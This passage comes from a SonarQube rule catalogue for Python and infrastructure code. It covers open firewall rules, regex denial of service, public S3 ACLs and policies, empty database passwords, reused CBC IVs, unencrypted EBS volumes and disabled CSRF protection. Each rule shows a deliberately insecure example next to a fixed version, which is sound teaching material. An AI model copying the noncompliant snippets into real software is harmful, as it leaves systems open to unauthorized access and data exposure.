traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services traditionally listen,
such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "networkSecurityGroups/example",
      "type": "Microsoft.Network/networkSecurityGroups/securityRules",
      "apiVersion": "2022-11-01",
      "properties": {
        "protocol": "*",
        "destinationPortRange": "*",
        "sourceAddressPrefix": "*",
        "access": "Allow",
        "direction": "Inbound"
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource securityRules 'Microsoft.Network/networkSecurityGroups/securityRules@2022-11-01' = {
  name: 'securityRules'
  properties: {
    direction: 'Inbound'
    access: 'Allow'
    protocol: '*'
    destinationPortRange: '*'
    sourceAddressPrefix: '*'
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "networkSecurityGroups/example",
      "type": "Microsoft.Network/networkSecurityGroups/securityRules",
      "apiVersion": "2022-11-01",
      "properties": {
          "protocol": "*",
          "destinationPortRange": "22",
          "sourceAddressPrefix": "10.0.0.0/24",
          "access": "Allow",
          "direction": "Inbound"
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource securityRules 'Microsoft.Network/networkSecurityGroups/securityRules@2022-11-01' = {
  name: 'securityRules'
  properties: {
    direction: 'Inbound'
    access: 'Allow'
    protocol: '*'
    destinationPortRange: '22'
    sourceAddressPrefix: '10.0.0.0/24'
  }
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Security groups for your VPC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview">Azure Documentation</a> - Network security
  groups </li>
  <li> <a href="https://cloud.google.com/vpc/docs/using-firewalls">GCP Documentation</a> - Firewalls </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5852">
              python:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating
an input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity
of the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger
<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too
with, in this case, a large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The input is user-controlled. </li>
  <li> The input size is not restricted to a small number of characters. </li>
  <li> There is no timeout in place to limit the regex evaluation time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>re.fullmatch</code>), the end of the regex
counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>
<ul>
  <li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different
  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if
  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only
  one way to match it). </li>
  <li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional
  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the
  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different
  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>.
  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>
  <li> If you’re performing a partial match (such as by using <code>re.search</code>, <code>re.split</code>, <code>re.findall</code> etc.) and the
  regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the regex engine
  will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it’s followed by a pattern that can
  fail, can cause quadratic runtime on some inputs. For example <code>re.split(r"\s*,", my_str)</code> will run in quadratic time on strings that
  consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li>
</ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul>
  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>
  for instance. </li>
  <li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this
  nested quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists
  exactly one <code>b</code> char per repetition of the group. </li>
  <li> Optimize regular expressions with <code>possessive quantifiers</code> and <code>atomic grouping</code> (available since Python 3.11). </li>
  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>
</ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when using partial
matches, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul>
  <li> Solve the problem without regular expressions </li>
  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2">RE2</a>. </li>
  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>re.split("\s*,\s*", my_str)</code> with <code>re.split(",",
  my_str)</code> and then trimming the spaces from the strings as a second step. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li>
  <li> <a
  href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6265">
              python:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul>
  <li> <code>PUBLIC_READ</code>, <code>PUBLIC_READ_WRITE</code> grant respectively "read" and "read and write" privileges to everyone in the world
  (<code>AllUsers</code> group). </li>
  <li> <code>AUTHENTICATED_READ</code> grants "read" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, i.e., to grant necessary permissions only to users for their required tasks. In the
context of canned ACL, set it to <code>PRIVATE</code> (the default one), and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>PUBLIC_READ_WRITE</code> access
control:</p>
<pre>
bucket = s3.Bucket(self, "bucket",
    access_control=s3.BucketAccessControl.PUBLIC_READ_WRITE     # Sensitive
)

s3deploy.BucketDeployment(self, "DeployWebsite",
    access_control=s3.BucketAccessControl.PUBLIC_READ_WRITE     # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>PRIVATE</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>
<pre>
bucket = s3.Bucket(self, "bucket",
    access_control=s3.BucketAccessControl.PRIVATE       # Compliant
)

# Another example
s3deploy.BucketDeployment(self, "DeployWebsite",
    access_control=s3.BucketAccessControl.PRIVATE       # Compliant
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html">AWS CDK version 2</a> - Class Bucket (construct) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2115">
              python:S2115
            </a>
          </td>
          <td>
            <details>
              <p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>
<h2>Why is this an issue?</h2>
<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting
this vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication
credentials.</p>
<h3>What is the potential impact?</h3>
<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially
leading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and
integrity of the database and the data it contains.</p>
<h4>Unauthorized Access to Sensitive Data</h4>
<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can
include personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the
database. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to
identity theft, financial loss, or reputational damage.</p>
<h4>Compromise of System Integrity</h4>
<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the
entire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,
unauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the
organization to further security risks.</p>
<h4>Unwanted Modifications or Deletions</h4>
<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a
significant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For
example, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business
processes and potentially leading to financial and legal consequences.</p>
<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system
compromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain
system integrity, and protect the organization from potential harm.</p>
<h2>How to fix it in MySQL Connector/Python</h2>
<h3>Code examples</h3>
<p>The following code uses an empty password to connect to a MySQL database.</p>
<p>The vulnerability can be fixed by using a strong password retrieved from an environment variable <code>DB_PASSWORD</code>. This environment
variable is set during deployment. It should be strong and different for each database.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="101" data-diff-type="noncompliant">
from mysql.connector import connection

connection.MySQLConnection(host='localhost', user='sonarsource', password='')  # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="101" data-diff-type="compliant">
from mysql.connector import connection
import os

db_password = os.getenv('DB_PASSWORD')
connection.MySQLConnection(host='localhost', user='sonarsource', password=db_password)
</pre>
<h3>Pitfalls</h3>
<h4>Hard-coded passwords</h4>
<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.
Here are a few reasons why it is not recommended:</p>
<ol>
  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or
  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>
  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be
  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>
  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control
  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>
</ol>
<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,
configuration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information
from the codebase.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S3329">
              python:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a "starting variable" (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in pyca</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from cryptography.hazmat.primitives.ciphers import (
    Cipher,
    algorithms,
    modes,
)

iv     = "doNotTryThis@Home2023"
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))

cipher.encryptor()  # Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
from os import urandom

from cryptography.hazmat.primitives.ciphers import (
    Cipher,
    algorithms,
    modes,
)

iv     = urandom(16)
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))

cipher.encryptor()
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul>
  <li> IVs must be unique for each encryption operation. </li>
  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>
</ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/329">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/780">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6275">
              python:S6275
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the
security of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access
to the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a
href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default">all new volumes and snapshots</a>. Volumes created
from snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The disk contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no
further modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption
globally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security
parameter will prevent any future unexpected security downgrade.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
from aws_cdk.aws_ec2 import Volume

class EBSVolumeStack(Stack):

    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        Volume(self,
            "unencrypted-explicit",
            availability_zone="eu-west-1a",
            size=Size.gibibytes(1),
            encrypted=False  # Sensitive
        )
</pre>
<pre>
from aws_cdk.aws_ec2 import Volume

class EBSVolumeStack(Stack):

    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        Volume(self,
            "unencrypted-implicit",
            availability_zone="eu-west-1a",
            size=Size.gibibytes(1)
        ) # Sensitive as encryption is disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.Volume.html">aws_cdk.aws_ec2.Volume</a>:</p>
<pre>
from aws_cdk.aws_ec2 import Volume

class EBSVolumeStack(Stack):

    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        Volume(self,
            "encrypted-explicit",
            availability_zone="eu-west-1a",
            size=Size.gibibytes(1),
            encrypted=True
        )
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html">Amazon EBS encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6270">
              python:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The AWS resource stores or processes sensitive data. </li>
  <li> The AWS resource is designed to be private. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, AnyPrincipal, Effect
from aws_cdk.aws_s3 import Bucket

bucket = Bucket(self, "ExampleBucket")

bucket.add_to_resource_policy(PolicyStatement(
  effect=Effect.ALLOW,
  actions=["s3:*"],
  resources=[bucket.arn_for_objects("*")],
  principals=[AnyPrincipal()] # Sensitive
))
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
from aws_cdk.aws_iam import PolicyStatement, AccountRootPrincipal, Effect
from aws_cdk.aws_s3 import Bucket

bucket = Bucket(self, "ExampleBucket")

bucket.add_to_resource_policy(PolicyStatement(
  effect=Effect.ALLOW,
  actions=["s3:*"],
  resources=[bucket.arn_for_objects("*")],
  principals=[AccountRootPrincipal()]
))
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4502">
              python:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul>  </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For a <a href="https://docs.djangoproject.com/fr/3.0/ref/csrf/">Django</a> application, the code is sensitive when,</p>
<ul>
  <li> <code>django.middleware.csrf.CsrfViewMiddleware</code> is not used in the <a
  href="https://docs.djangoproject.com/en/3.0/topics/settings/">Django settings</a>: </li>
</ul>
<pre>
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
] # Sensitive: django.middleware.csrf.CsrfViewMiddleware is missing
</pre>
<ul>
  <li> the CSRF protection is disabled on a view: </li>
</ul>
<pre>
@csrf_exempt # Sensitive
def example(request):
    return HttpResponse("default")
</pre>
<p>For a <a href="https://flask-wtf.readthedocs.io/en/latest/csrf.html">Flask</a> application, the code is sensitive when,</p>
<ul>
  <li> the <code>WTF_CSRF_ENABLED</code> setting is set to <code>false</code>: </li>
</ul>
<pre>
app = Flask(__name__)
app.config['WTF_CSRF_ENABLED'] = False # Sensitive
</pre>
<ul>
  <li> the application doesn’t use the <code>CSRFProtect</code> module: </li>
</ul>
<pre>
app = Flask(__name__) # Sensitive: CSRFProtect is missing

@app.route('/')
def hello_world():
    return 'Hello, World!'
</pre>
<ul>
  <li> the CSRF protection is disabled on a view: </li>
</ul>
<pre>
app = Flask(__name__)
csrf = CSRFProtect()
csrf.init_app(app)

@app.route('/example/', methods=['POST'])
@csrf.exempt # Sensitive
def example():
    return 'example '
</pre>
<ul>
  <li> the CSRF protection is disabled on a form: </li>
</ul>
<pre>
class unprotectedForm(FlaskForm):
    class Meta:
        csrf = False # Sensitive

    name = TextField('name')
    submit = SubmitField('submit')
</pre>
<h2>Compliant Solution</h2>
<p>For a <a href="https://docs.djangoproject.com/fr/3.0/ref/csrf/">Django</a> application,</p>
<ul>
  <li> it is recommended to protect all the views with <code>django.middleware.csrf.CsrfViewMiddleware</code>: </li>
</ul>
<pre>
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware', # Compliant
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
</pre>
<ul>
  <li> and to not disable the CSRF protection on specific views: </li>
</ul>
<pre>
def example(request): # Compliant
    return HttpResponse("default")
</pre>
<p>For a <a href="https://flask-wtf.readthedocs.io/en/latest/csrf.html">Flask</a> application,</p>
<ul>
  <li> the <code>CSRFProtect</code> module should be used (and not disabled further with <code>WTF_CSRF_ENABLED</code> set to <code>false</code>):
  </li>
</ul>
<pre>
app = Flask(__name__)
csrf = CSRFProtect()
csrf.init_app(app) # Compliant
</pre>
<ul>
  <li> and it is recommended to not disable the CSRF protection on specific views or forms: </li>
</ul>
<pre>
@app.route('/example/', methods=['POST']) # Compliant
def example():
    return 'example '

class unprotectedForm(FlaskForm):
    class Meta:
        csrf = True # Compliant

    name = TextField('name')
    submit = SubmitField('submit')
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6245">
              python:S6245
            </a>
          </td>
          <td>
            <details>
